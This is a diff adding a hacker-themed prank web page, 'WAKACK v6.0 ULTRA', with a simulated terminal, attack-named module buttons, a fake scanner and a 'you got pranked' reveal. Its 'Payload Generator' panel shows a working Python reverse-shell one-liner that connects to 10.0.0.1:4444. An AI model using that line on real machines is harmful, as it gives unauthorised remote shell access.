@@ -1,0 +1,815 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full bg-black text-green-500 font-mono select-none">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WAKACK v6.0 ULTRA — Dark Skull Cyber Terminal & Suite</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;600;700&family=Orbitron:wght@500;700;900&display=swap" rel="stylesheet">
+
+    <style>
+        body {
+            font-family: 'Fira Code', monospace;
+            background-color: #000;
+            background-image: radial-gradient(circle at center, rgba(15, 0, 5, 0.8) 0%, rgba(0, 0, 0, 0.95) 100%), url('https://i.pinimg.com/originals/c4/40/38/c4403808c2f77193bea366c1a9db04bd.gif');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+        }
+        .orbitron { font-family: 'Orbitron', sans-serif; }
+
+        /* CRT Scanline Effect */
+        .crt::before {
+            content: " ";
+            display: block;
+            position: absolute;
+            top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.45) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.05), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.05));
+            z-index: 40;
+            background-size: 100% 3px, 6px 100%;
+            pointer-events: none;
+            opacity: 0.85;
+        }
+
+        /* Glitch Animation */
+        .glitch-text {
+            animation: glitch 2s infinite;
+        }
+        @keyframes glitch {
+            0% { text-shadow: 2px 0 #ff0055, -2px 0 #00ff66; }
+            50% { text-shadow: -2px 0 #ff0055, 2px 0 #00e5ff; }
+            100% { text-shadow: 2px 0 #ff0055, -2px 0 #00ff66; }
+        }
+
+        /* Glow Styles */
+        .text-glow-red { text-shadow: 0 0 10px #ff0055, 0 0 20px #ff0055; }
+        .text-glow-green { text-shadow: 0 0 8px #00ff66; }
+        .box-glow-red { box-shadow: 0 0 20px rgba(255, 0, 85, 0.4); }
+        .box-glow-cyan { box-shadow: 0 0 20px rgba(0, 229, 255, 0.3); }
+
+        /* Custom Scrollbars */
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: rgba(0, 10, 5, 0.9); }
+        ::-webkit-scrollbar-thumb { background: #00ff66; border-radius: 3px; box-shadow: 0 0 10px #00ff66; }
+        ::-webkit-scrollbar-thumb:hover { background: #ff0055; box-shadow: 0 0 12px #ff0055; }
+    </style>
+</head>
+<body class="h-full crt relative flex flex-col justify-between overflow-x-hidden text-xs md:text-sm select-none" id="app-body">
+
+    <!-- INITIAL LOADING SCREEN WITH USER GIF -->
+    <div id="loading-screen" class="fixed inset-0 z-50 bg-black flex flex-col items-center justify-center p-4">
+        <div class="relative flex flex-col items-center space-y-4 max-w-md text-center">
+            <img src="https://i.pinimg.com/originals/79/b6/54/79b654e55f3cf04396b4a88160fd557e.gif" 
+                 alt="Loading Skull GIF" 
+                 onerror="this.src='https://placehold.co/150x150/000000/ff0055?text=WAKACK+OS'" 
+                 class="w-36 h-36 object-contain rounded-full border-2 border-red-600 shadow-[0_0_30px_#ff0055]">
+            <h1 class="orbitron text-2xl md:text-3xl font-black text-red-500 tracking-widest glitch-text">
+                WAKACK v6.0 ULTRA
+            </h1>
+            <p class="text-green-400 text-xs font-mono" id="loading-status-text">Booting Neural Subsystems & Cyber Engine...</p>
+            <div class="w-full bg-gray-950 border border-green-500/50 rounded-full h-3 overflow-hidden p-0.5">
+                <div id="loader-bar" class="bg-gradient-to-r from-green-500 via-cyan-400 to-red-600 h-full w-0 rounded-full transition-all duration-200"></div>
+            </div>
+            <div class="text-[10px] text-gray-500 font-mono tracking-wider">DARK SKULL SECURITY ECOSYSTEM</div>
+        </div>
+    </div>
+
+    <!-- BACKGROUND MATRIX CANVAS -->
+    <div class="fixed inset-0 pointer-events-none z-0 overflow-hidden">
+        <canvas id="matrix-canvas" class="w-full h-full absolute inset-0 opacity-30"></canvas>
+    </div>
+
+    <!-- MAIN APP CONTAINER -->
+    <div class="relative z-10 flex flex-col h-screen max-h-screen p-2 md:p-3 gap-2">
+        
+        <!-- TOP NAVIGATION HEADER -->
+        <header class="bg-black/90 backdrop-blur-md border border-red-600/50 rounded-lg p-2 md:p-3 flex flex-wrap items-center justify-between gap-2 box-glow-red">
+            <div class="flex items-center space-x-3">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS4mb9zZYkr1piRWNcEiRtfv2N_X0bgG3dsVYGyWCJBlg&s=10" 
+                     alt="Badge Avatar" 
+                     onerror="this.src='https://placehold.co/40x40/ff0055/ffffff?text=W'" 
+                     class="w-8 h-8 rounded-full border border-green-400 object-cover shadow-[0_0_10px_#00ff66]">
+                <div>
+                    <span class="orbitron font-extrabold text-red-500 text-xs md:text-sm tracking-wider flex items-center gap-2 text-glow-red">
+                        <i class="fa-solid fa-skull text-green-400 animate-pulse"></i> WAKACK v6.0 ULTRA
+                    </span>
+                    <span class="text-[9px] text-cyan-400 tracking-widest block font-mono">ADVANCED CYBER SUITE</span>
+                </div>
+            </div>
+
+            <!-- TAB CONTROLS -->
+            <div class="flex items-center bg-gray-950 border border-green-500/40 rounded-lg p-1 gap-1">
+                <button id="nav-terminal-btn" onclick="switchTab('terminal')" class="px-3 py-1 rounded text-xs font-bold transition-all bg-green-950 text-green-300 border border-green-500/50 flex items-center gap-1.5">
+                    <i class="fa-solid fa-terminal"></i> Terminal
+                </button>
+                <button id="nav-tools-btn" onclick="switchTab('tools')" class="px-3 py-1 rounded text-xs font-bold transition-all text-gray-400 hover:text-green-400 flex items-center gap-1.5">
+                    <i class="fa-solid fa-microchip"></i> Cyber Toolkit
+                </button>
+                <button id="nav-blog-btn" onclick="switchTab('blog')" class="px-3 py-1 rounded text-xs font-bold transition-all text-gray-400 hover:text-green-400 flex items-center gap-1.5">
+                    <i class="fa-solid fa-newspaper"></i> Knowledge Hub
+                </button>
+            </div>
+
+            <!-- AUDIO VISUALIZER & SYSTEM BUTTONS -->
+            <div class="flex items-center space-x-2">
+                <!-- AUDIO FREQUENCY BARS -->
+                <div class="hidden lg:flex items-end gap-1 h-5 px-2 bg-gray-950 border border-green-500/30 rounded">
+                    <span class="w-1 bg-green-400 rounded-t h-2 animate-bounce"></span>
+                    <span class="w-1 bg-cyan-400 rounded-t h-4 animate-pulse"></span>
+                    <span class="w-1 bg-red-500 rounded-t h-3 animate-bounce" style="animation-delay: 0.1s"></span>
+                    <span class="w-1 bg-yellow-400 rounded-t h-5 animate-pulse"></span>
+                </div>
+
+                <button onclick="toggleSound()" id="sound-btn" class="px-2.5 py-1 bg-gray-900 border border-green-500/40 hover:border-green-400 rounded text-xs text-gray-300 flex items-center gap-1">
+                    <i class="fa-solid fa-volume-high text-green-400"></i> <span class="hidden sm:inline">SFX</span>
+                </button>
+                <button onclick="toggleCRT()" id="crt-btn" class="px-2.5 py-1 bg-gray-900 border border-green-500/40 hover:border-green-400 rounded text-xs text-gray-300 flex items-center gap-1">
+                    <i class="fa-solid fa-tv text-cyan-400"></i> <span class="hidden sm:inline">CRT</span>
+                </button>
+                <span class="px-2.5 py-1 bg-green-950/90 border border-green-500/50 rounded text-green-400 text-xs flex items-center gap-1.5 font-bold">
+                    <span class="w-2 h-2 rounded-full bg-green-400 animate-ping"></span> ACTIVE
+                </span>
+            </div>
+        </header>
+
+        <!-- VIEW 1: MAIN TERMINAL VIEW -->
+        <div id="view-terminal" class="flex-1 flex flex-col md:flex-row gap-2.5 overflow-hidden">
+            
+            <!-- LEFT MODULE CONTROLS SIDEBAR -->
+            <aside class="w-full md:w-80 bg-black/90 backdrop-blur-md border border-red-500/40 rounded-lg p-2.5 flex flex-col justify-between overflow-y-auto space-y-2.5 shadow-[0_0_15px_rgba(255,0,0,0.2)]">
+                
+                <!-- TARGET SPECIFIER PANEL -->
+                <div class="bg-gray-950/90 border border-green-500/40 rounded-lg p-2 space-y-1.5">
+                    <label class="text-[11px] text-green-400 font-semibold tracking-wider flex justify-between items-center">
+                        <span><i class="fa-solid fa-crosshairs text-red-500 mr-1"></i> TARGET LOCK</span>
+                        <span id="target-status-badge" class="text-[9px] bg-red-950 text-red-400 px-1.5 py-0.5 rounded border border-red-500/50 font-bold">READY</span>
+                    </label>
+                    <div class="flex gap-1.5">
+                        <input type="text" id="target-input" value="+1 (555) 019-2831" 
+                               class="w-full bg-black/90 border border-green-500/50 rounded px-2 py-1 text-xs text-green-300 focus:outline-none focus:border-red-500 transition-colors"
+                               placeholder="Phone / IP / Target">
+                        <button onclick="setTargetFromInput()" class="px-3 py-1 bg-red-950 hover:bg-red-900 border border-red-500 text-red-100 rounded text-xs font-bold transition-all">
+                            LOCK
+                        </button>
+                    </div>
+                </div>
+
+                <!-- ANIMATED SKULL EMBED -->
+                <div class="w-full h-24 bg-black/80 border border-red-500/30 rounded-lg overflow-hidden flex items-center justify-center p-1 relative">
+                    <img src="https://miro.medium.com/0*LjMFY5OyP1SqhGHc.gif" 
+                         alt="Dark Skull GIF" 
+                         onerror="this.src='https://placehold.co/200x80/000000/ff0055?text=SKULL+ANIMATION'"
+                         class="w-full h-full object-cover rounded">
+                    <div class="absolute bottom-1 right-2 text-[9px] text-cyan-400 font-mono bg-black/70 px-1 rounded">MATRIX ENGINE</div>
+                </div>
+
+                <!-- 18 SIMULATION MODULE BUTTONS -->
+                <div class="flex-1 space-y-1 min-h-0">
+                    <div class="text-[10px] text-gray-400 font-semibold tracking-wider mb-1 flex items-center justify-between">
+                        <span><i class="fa-solid fa-cubes text-green-400 mr-1"></i> SIMULATOR MODULES</span>
+                        <span class="text-[10px] text-cyan-400 font-bold">18 LOADED</span>
+                    </div>
+                    <div class="grid grid-cols-2 gap-1 max-h-[260px] md:max-h-full overflow-y-auto pr-1">
+                        <button onclick="runModule('target')" class="p-1.5 bg-gray-950 hover:bg-green-950 border border-green-500/30 hover:border-green-400 rounded text-left text-[11px] text-green-400 hover:text-green-300 transition-all flex items-center gap-1">
+                            <span class="text-red-400 font-bold">[01]</span> Target Lock
+                        </button>
+                        <button onclick="runModule('recon')" class="p-1.5 bg-gray-950 hover:bg-green-950 border border-green-500/30 hover:border-green-400 rounded text-left text-[11px] text-green-400 hover:text-green-300 transition-all flex items-center gap-1">
+                            <span class="text-cyan-400 font-bold">[02]</span> Recon Scan
+                        </button>
+                        <button onclick="runModule('exploit')" class="p-1.5 bg-gray-950 hover:bg-green-950 border border-green-500/30 hover:border-green-400 rounded text-left text-[11px] text-green-400 hover:text-green-300 transition-all flex items-center gap-1">
+                            <span class="text-yellow-400 font-bold">[03]</span> Payload Dev
+                        </button>
+                        <button onclick="runModule('hash')" class="p-1.5 bg-gray-950 hover:bg-green-950 border border-green-500/30 hover:border-green-400 rounded text-left text-[11px] text-green-400 hover:text-green-300 transition-all flex items-center gap-1">
+                            <span class="text-emerald-400 font-bold">[04]</span> Hash Cracker
+                        </button>
+                        <button onclick="runModule('session')" class="p-1.5 bg-gray-950 hover:bg-green-950 border border-green-500/30 hover:border-green-400 rounded text-left text-[11px] text-green-400 hover:text-green-300 transition-all flex items-center gap-1">
+                            <span class="text-purple-400 font-bold">[05]</span> Session Hijack
+                        </button>
+                        <button onclick="runModule('exfil')" class="p-1.5 bg-gray-950 hover:bg-green-950 border border-green-500/30 hover:border-green-400 rounded text-left text-[11px] text-green-400 hover:text-green-300 transition-all flex items-center gap-1">
+                            <span class="text-amber-400 font-bold">[06]</span> Data Exfil
+                        </button>
+                        <button onclick="runModule('cred')" class="p-1.5 bg-gray-950 hover:bg-green-950 border border-green-500/30 hover:border-green-400 rounded text-left text-[11px] text-green-400 hover:text-green-300 transition-all flex items-center gap-1">
+                            <span class="text-red-400 font-bold">[07]</span> Cred Dump
+                        </button>
+                        <button onclick="runModule('keylogger')" class="p-1.5 bg-gray-950 hover:bg-green-950 border border-green-500/30 hover:border-green-400 rounded text-left text-[11px] text-green-400 hover:text-green-300 transition-all flex items-center gap-1">
+                            <span class="text-cyan-400 font-bold">[08]</span> Keylogger
+                        </button>
+                        <button onclick="runModule('ransom')" class="p-1.5 bg-gray-950 hover:bg-green-950 border border-green-500/30 hover:border-green-400 rounded text-left text-[11px] text-green-400 hover:text-green-300 transition-all flex items-center gap-1">
+                            <span class="text-red-500 font-bold">[09]</span> Ransomware
+                        </button>
+                        <button onclick="runModule('ddos')" class="p-1.5 bg-gray-950 hover:bg-green-950 border border-green-500/30 hover:border-green-400 rounded text-left text-[11px] text-green-400 hover:text-green-300 transition-all flex items-center gap-1">
+                            <span class="text-orange-400 font-bold">[10]</span> DDoS Flood
+                        </button>
+                        <button onclick="runModule('sqli')" class="p-1.5 bg-gray-950 hover:bg-green-950 border border-green-500/30 hover:border-green-400 rounded text-left text-[11px] text-green-400 hover:text-green-300 transition-all flex items-center gap-1">
+                            <span class="text-yellow-400 font-bold">[11]</span> SQL Injection
+                        </button>
+                        <button onclick="runModule('xss')" class="p-1.5 bg-gray-950 hover:bg-green-950 border border-green-500/30 hover:border-green-400 rounded text-left text-[11px] text-green-400 hover:text-green-300 transition-all flex items-center gap-1">
+                            <span class="text-teal-400 font-bold">[12]</span> XSS Attack
+                        </button>
+                        <button onclick="runModule('phish')" class="p-1.5 bg-gray-950 hover:bg-green-950 border border-green-500/30 hover:border-green-400 rounded text-left text-[11px] text-green-400 hover:text-green-300 transition-all flex items-center gap-1">
+                            <span class="text-pink-400 font-bold">[13]</span> Phish Page
+                        </button>
+                        <button onclick="runModule('logs')" class="p-1.5 bg-gray-950 hover:bg-green-950 border border-green-500/30 hover:border-green-400 rounded text-left text-[11px] text-green-400 hover:text-green-300 transition-all flex items-center gap-1">
+                            <span class="text-indigo-400 font-bold">[14]</span> Log Metadata
+                        </button>
+                        <button onclick="runModule('persist')" class="p-1.5 bg-gray-950 hover:bg-green-950 border border-green-500/30 hover:border-green-400 rounded text-left text-[11px] text-green-400 hover:text-green-300 transition-all flex items-center gap-1">
+                            <span class="text-rose-400 font-bold">[15]</span> Persistence
+                        </button>
+                        <button onclick="runModule('full')" class="p-1.5 bg-red-950/80 hover:bg-red-900 border border-red-500/60 rounded text-left text-[11px] text-yellow-300 transition-all flex items-center gap-1 font-bold">
+                            <span class="text-yellow-400">[16]</span> FULL CHAIN
+                        </button>
+                    </div>
+                </div>
+
+                <!-- ACTION BUTTONS -->
+                <div class="space-y-1.5 pt-2 border-t border-red-500/30">
+                    <button onclick="exportReport()" class="w-full p-2 bg-green-950/80 hover:bg-green-900 border border-green-500/50 rounded text-xs text-green-300 transition-all flex items-center justify-center gap-2 font-bold">
+                        <i class="fa-solid fa-file-arrow-down"></i> [17] EXPORT LOG FILE
+                    </button>
+
+                    <button onclick="triggerPrank()" class="w-full p-2.5 bg-gradient-to-r from-red-900 via-red-600 to-red-900 hover:from-red-800 hover:to-red-700 border border-red-400 text-white font-bold orbitron rounded shadow-[0_0_15px_rgba(255,0,85,0.7)] transition-all transform hover:scale-[1.02] active:scale-95 flex items-center justify-center gap-2 tracking-wider">
+                        <i class="fa-solid fa-skull-crossbones text-yellow-300 animate-bounce"></i> [18] REVEAL PRANK
+                    </button>
+                </div>
+            </aside>
+
+            <!-- MAIN TERMINAL OUTPUT CONTAINER -->
+            <main class="flex-1 bg-black/90 backdrop-blur-xl border border-red-500/40 rounded-lg flex flex-col justify-between overflow-hidden shadow-[0_0_25px_rgba(0,0,0,0.9)]">
+                
+                <!-- TERMINAL HEADER RADAR & MONITOR -->
+                <div class="bg-gray-950 border-b border-green-500/30 p-2 flex items-center justify-between text-[11px] text-gray-400">
+                    <div class="flex items-center gap-3">
+                        <span class="text-green-400 flex items-center gap-1.5">
+                            <i class="fa-solid fa-terminal text-cyan-400"></i> wakack-shell v6.0
+                        </span>
+                        <span class="text-gray-500">|</span>
+                        <span class="text-yellow-400" id="live-ip-display">IP: 192.168.1.104</span>
+                    </div>
+                    <div class="flex items-center gap-2">
+                        <span class="text-gray-400">CPU: <span id="cpu-load" class="text-cyan-400 font-bold">12%</span></span>
+                        <span class="text-gray-400">MEM: <span id="mem-load" class="text-green-400 font-bold">410MB</span></span>
+                    </div>
+                </div>
+
+                <!-- TERMINAL LOG SCREEN -->
+                <div id="terminal-screen" class="flex-1 p-3 md:p-4 overflow-y-auto space-y-2 font-mono text-xs md:text-sm leading-relaxed">
+                    <!-- ASCII LOGO BANNER -->
+                    <div class="text-green-400 mb-2 border-b border-green-500/30 pb-3">
+                        <pre class="text-[7px] sm:text-[9px] md:text-xs font-bold text-green-400 leading-none overflow-x-auto">
+   _   _   ___   _  __  ___   ___  _  __  __   _  _   _____  ___   ___  
+  | | | | / _ \ | |/ / / _ \ / ___|| |/ / / /  | || | |_   _|| _ \ / _ \ 
+  | |_| ||  _  || ' < |  _  | /__  | ' < / /_  | || |   | |  |   /|  _  |
+   \___/ |_| |_||_|\_\|_| |_|\___|_|_|\_\\___/ |_||_|   |_|  |_|_\|_| |_|
+  ========================================================================
+  WAKACK v6.0 ULTRA — Safe Cyber Simulation, Security Suite & Toolkit
+  All outputs are generated locally. Type 'help' or 'tools' to begin.
+  ------------------------------------------------------------------------
+                        </pre>
+                    </div>
+
+                    <!-- LOG ENTRY CONTAINER -->
+                    <div id="terminal-logs" class="space-y-1.5"></div>
+                </div>
+
+                <!-- CLI COMMAND INPUT -->
+                <div class="bg-gray-950/95 border-t border-red-500/40 p-2 md:p-2.5 flex items-center gap-2">
+                    <span class="text-red-500 font-bold flex items-center gap-1">
+                        <span class="text-green-400">wakack@dark-skull</span>:<span class="text-cyan-400">~</span>#
+                    </span>
+                    <input type="text" id="cli-input" 
+                           class="flex-1 bg-transparent text-green-300 font-mono focus:outline-none placeholder-gray-600 text-xs md:text-sm"
+                           placeholder="Type command ('1'-'18', 'scan', 'decrypt', 'payload', 'help')..."
+                           autocomplete="off" spellcheck="false">
+                    <button onclick="handleCliSubmit()" class="px-3 py-1 bg-green-950 hover:bg-green-900 border border-green-500/60 rounded text-green-400 text-xs font-bold transition-all">
+                        EXECUTE
+                    </button>
+                </div>
+            </main>
+        </div>
+
+        <!-- VIEW 2: CYBER TOOLKIT TAB -->
+        <div id="view-tools" class="hidden flex-1 bg-black/90 backdrop-blur-xl border border-red-500/40 rounded-lg p-3 md:p-4 flex flex-col md:flex-row gap-4 overflow-y-auto shadow-[0_0_25px_rgba(0,0,0,0.9)]">
+            
+            <!-- TOOLKIT 1: NETWORK SCANNER -->
+            <div class="flex-1 bg-gray-950/90 border border-green-500/40 rounded-xl p-3 flex flex-col justify-between space-y-3">
+                <div class="border-b border-green-500/30 pb-2">
+                    <span class="text-xs text-cyan-400 font-bold uppercase tracking-widest"><i class="fa-solid fa-network-wired mr-1"></i> Interactive Network Map</span>
+                    <h3 class="text-sm font-bold text-green-300 mt-1">Live Node Scanner</h3>
+                </div>
+                <div class="space-y-2 text-xs">
+                    <div class="flex justify-between items-center p-2 bg-black/70 border border-green-500/30 rounded">
+                        <span>192.168.1.1 (Gateway Router)</span>
+                        <span class="text-green-400 font-bold">ONLINE (1.2ms)</span>
+                    </div>
+                    <div class="flex justify-between items-center p-2 bg-black/70 border border-yellow-500/30 rounded">
+                        <span>192.168.1.45 (Target System)</span>
+                        <span class="text-yellow-400 font-bold">EXPOSED (22, 80, 443)</span>
+                    </div>
+                    <div class="flex justify-between items-center p-2 bg-black/70 border border-red-500/30 rounded">
+                        <span>192.168.1.109 (DB Server)</span>
+                        <span class="text-red-400 font-bold">VULNERABLE (SQLi)</span>
+                    </div>
+                </div>
+                <button onclick="runModule('recon')" class="w-full py-2 bg-green-950 hover:bg-green-900 border border-green-500 text-green-300 text-xs font-bold rounded transition-all">
+                    RUN DEEP NODE SCAN
+                </button>
+            </div>
+
+            <!-- TOOLKIT 2: DECRYPTOR ENGINE -->
+            <div class="flex-1 bg-gray-950/90 border border-yellow-500/40 rounded-xl p-3 flex flex-col justify-between space-y-3">
+                <div class="border-b border-yellow-500/30 pb-2">
+                    <span class="text-xs text-yellow-400 font-bold uppercase tracking-widest"><i class="fa-solid fa-key mr-1"></i> Real-time Hash Engine</span>
+                    <h3 class="text-sm font-bold text-green-300 mt-1">Hash Cracker & Decryptor</h3>
+                </div>
+                <div class="space-y-2">
+                    <label class="text-[10px] text-gray-400">Target Hash String (MD5 / SHA256):</label>
+                    <input type="text" id="hash-tool-input" value="5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8" 
+                           class="w-full bg-black border border-yellow-500/50 rounded px-2 py-1 text-xs text-yellow-300 font-mono">
+                    <div id="decryptor-output" class="p-2 bg-black border border-gray-800 rounded text-xs text-green-400 font-mono min-h-[50px] flex items-center justify-center text-center">
+                        Click 'Crack Hash' to initiate dictionary match...
+                    </div>
+                </div>
+                <button onclick="simulateHashCrackTool()" class="w-full py-2 bg-yellow-950 hover:bg-yellow-900 border border-yellow-500 text-yellow-200 text-xs font-bold rounded transition-all">
+                    CRACK HASH NOW
+                </button>
+            </div>
+
+            <!-- TOOLKIT 3: PAYLOAD SYNTHESIZER -->
+            <div class="flex-1 bg-gray-950/90 border border-red-500/40 rounded-xl p-3 flex flex-col justify-between space-y-3">
+                <div class="border-b border-red-500/30 pb-2">
+                    <span class="text-xs text-red-400 font-bold uppercase tracking-widest"><i class="fa-solid fa-code-merge mr-1"></i> Payload Generator</span>
+                    <h3 class="text-sm font-bold text-green-300 mt-1">Custom Shell Synthesizer</h3>
+                </div>
+                <div class="space-y-2 text-xs">
+                    <div>
+                        <label class="text-[10px] text-gray-400">Payload Format:</label>
+                        <select id="payload-type" class="w-full bg-black border border-red-500/50 rounded p-1 text-red-300">
+                            <option>Reverse Shell (Python3)</option>
+                            <option>Netcat Listener Script</option>
+                            <option>Bash Web Hook Vector</option>
+                        </select>
+                    </div>
+                    <div class="p-2 bg-black border border-red-500/30 rounded font-mono text-[10px] text-red-400 overflow-x-auto">
+                        import socket,os,pty;s=socket.socket();s.connect(("10.0.0.1",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")
+                    </div>
+                </div>
+                <button onclick="runModule('exploit')" class="w-full py-2 bg-red-950 hover:bg-red-900 border border-red-500 text-red-200 text-xs font-bold rounded transition-all">
+                    GENERATE & COPY PAYLOAD
+                </button>
+            </div>
+        </div>
+
+        <!-- VIEW 3: KNOWLEDGE HUB / SECURITY BLOG -->
+        <div id="view-blog" class="hidden flex-1 bg-black/90 backdrop-blur-xl border border-red-500/40 rounded-lg p-3 md:p-4 flex flex-col md:flex-row gap-4 overflow-hidden shadow-[0_0_25px_rgba(0,0,0,0.9)]">
+            
+            <!-- ARTICLES INDEX SIDEBAR -->
+            <div class="w-full md:w-80 border-r border-green-500/20 pr-0 md:pr-4 overflow-y-auto space-y-2">
+                <div class="text-xs text-green-400 font-bold tracking-widest uppercase mb-3 flex items-center gap-2">
+                    <i class="fa-solid fa-book-skull text-red-500"></i> Knowledge Hub Index
+                </div>
+
+                <div onclick="showArticle('art-1')" class="p-2.5 bg-gray-950 border border-green-500/40 hover:border-green-400 rounded-lg cursor-pointer transition-all">
+                    <span class="text-[10px] text-cyan-400 block font-bold">ARCHITECTURE</span>
+                    <h3 class="text-xs font-bold text-green-300 mt-0.5">WAKACK v6.0 Core Architecture</h3>
+                </div>
+
+                <div onclick="showArticle('art-2')" class="p-2.5 bg-gray-950 border border-green-500/20 hover:border-green-400 rounded-lg cursor-pointer transition-all">
+                    <span class="text-[10px] text-yellow-400 block font-bold">ETHICAL RULES</span>
+                    <h3 class="text-xs font-bold text-green-300 mt-0.5">Simulators vs Malicious Tools</h3>
+                </div>
+
+                <div onclick="showArticle('art-3')" class="p-2.5 bg-gray-950 border border-green-500/20 hover:border-green-400 rounded-lg cursor-pointer transition-all">
+                    <span class="text-[10px] text-red-400 block font-bold">LOCAL SETUP</span>
+                    <h3 class="text-xs font-bold text-green-300 mt-0.5">Running WAKACK CLI Locally</h3>
+                </div>
+
+                <div onclick="showArticle('art-4')" class="p-2.5 bg-gray-950 border border-green-500/20 hover:border-green-400 rounded-lg cursor-pointer transition-all">
+                    <span class="text-[10px] text-emerald-400 block font-bold">CYBER DEFENSE</span>
+                    <h3 class="text-xs font-bold text-green-300 mt-0.5">Hardening Linux Systems</h3>
+                </div>
+            </div>
+
+            <!-- ARTICLE READER AREA -->
+            <div id="article-reader" class="flex-1 overflow-y-auto pr-2 text-xs md:text-sm space-y-3 leading-relaxed">
+                <!-- Articles injected dynamically -->
+            </div>
+        </div>
+    </div>
+
+    <!-- PRANK REVEAL MODAL -->
+    <div id="prank-modal" class="fixed inset-0 bg-black/95 backdrop-blur-2xl z-50 flex flex-col items-center justify-center p-4 hidden border-4 border-red-600 shadow-[0_0_50px_rgba(255,0,85,0.8)]">
+        <div class="max-w-lg w-full bg-gray-950 border-2 border-red-500 rounded-2xl p-6 text-center space-y-5 relative overflow-hidden">
+            <i class="fa-solid fa-skull-crossbones text-red-500 text-6xl animate-bounce"></i>
+            <h1 class="orbitron text-2xl md:text-3xl font-black text-red-500 text-glow-red tracking-widest">
+                YOU GOT PRANKED!
+            </h1>
+            <p class="text-xs md:text-sm text-gray-200 font-semibold px-4 py-3 bg-red-950/40 border border-red-500/40 rounded-lg">
+                Relax! No systems were touched and 0 bytes were transmitted. This application is a safe cyber simulator created for educational and entertainment purposes!
+            </p>
+            <div class="flex justify-center gap-3 pt-2">
+                <button onclick="closePrank()" class="px-5 py-2.5 bg-red-950 hover:bg-red-900 border border-red-500 text-red-200 font-bold rounded-lg text-xs md:text-sm transition-all flex items-center gap-2">
+                    <i class="fa-solid fa-rotate-left"></i> RETURN TO SUITE
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- COMPLETE JAVASCRIPT LOGIC -->
+    <script>
+        // State
+        let soundEnabled = true;
+        let crtEnabled = true;
+        let currentTarget = "+1 (555) 019-2831";
+        let sessionLogs = [];
+        let audioCtx = null;
+
+        // Startup Progress Bar Simulation
+        window.addEventListener('DOMContentLoaded', () => {
+            let progress = 0;
+            const bar = document.getElementById('loader-bar');
+            const statusText = document.getElementById('loading-status-text');
+            const steps = [
+                "Initializing Dark Skull Neural Core...",
+                "Loading 18 Simulator Modules...",
+                "Synthesizing Audio Engine...",
+                "Binding Matrix Streams..."
+            ];
+
+            const interval = setInterval(() => {
+                progress += 20;
+                if (bar) bar.style.width = progress + '%';
+                if (statusText) statusText.innerText = steps[Math.floor((progress / 100) * (steps.length - 1))];
+
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        const loader = document.getElementById('loading-screen');
+                        if (loader) loader.style.display = 'none';
+                        appendLog('WAKACK v6.0 ULTRA Subsystems initialized successfully.', 'cyan');
+                        appendLog('Type "help" for command listing or "tools" for Cyber Toolkit.', 'yellow');
+                    }, 300);
+                }
+            }, 80);
+        });
+
+        // Audio Synthesis (Web Audio API)
+        function initAudio() {
+            if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        }
+
+        function playBeep(freq = 800, duration = 0.05, vol = 0.03) {
+            if (!soundEnabled) return;
+            try {
+                initAudio();
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.type = 'sine';
+                osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
+                gain.gain.setValueAtTime(vol, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + duration);
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.start();
+                osc.stop(audioCtx.currentTime + duration);
+            } catch(e) {}
+        }
+
+        function toggleSound() {
+            soundEnabled = !soundEnabled;
+            const btn = document.getElementById('sound-btn');
+            btn.innerHTML = soundEnabled ? '<i class="fa-solid fa-volume-high text-green-400"></i> <span class="hidden sm:inline">SFX</span>' : '<i class="fa-solid fa-volume-xmark text-red-400"></i> <span class="hidden sm:inline">MUTED</span>';
+        }
+
+        function toggleCRT() {
+            crtEnabled = !crtEnabled;
+            document.getElementById('app-body').classList.toggle('crt', crtEnabled);
+        }
+
+        // Matrix Background Rendering
+        const canvas = document.getElementById('matrix-canvas');
+        const ctx = canvas.getContext('2d');
+        let drops = [];
+        const chars = "01ABCDEFGHIJKLMNOPQRSTUVWXYZ#$%&*@";
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            drops = Array(Math.floor(canvas.width / 18)).fill(1);
+        }
+        window.addEventListener('resize', resizeCanvas);
+        resizeCanvas();
+
+        function drawMatrix() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.08)";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#00ff66";
+            ctx.font = "14px 'Fira Code', monospace";
+
+            for (let i = 0; i < drops.length; i++) {
+                const text = chars.charAt(Math.floor(Math.random() * chars.length));
+                ctx.fillText(text, i * 18, drops[i] * 18);
+                if (drops[i] * 18 > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 45);
+
+        // Terminal Logging
+        function getTime() {
+            return new Date().toLocaleTimeString();
+        }
+
+        function appendLog(msg, color = 'green') {
+            const container = document.getElementById('terminal-logs');
+            if (!container) return;
+            const entry = document.createElement('div');
+            
+            let colorClass = 'text-green-400';
+            if (color === 'red') colorClass = 'text-red-400 font-semibold';
+            if (color === 'yellow') colorClass = 'text-yellow-400';
+            if (color === 'cyan') colorClass = 'text-cyan-400';
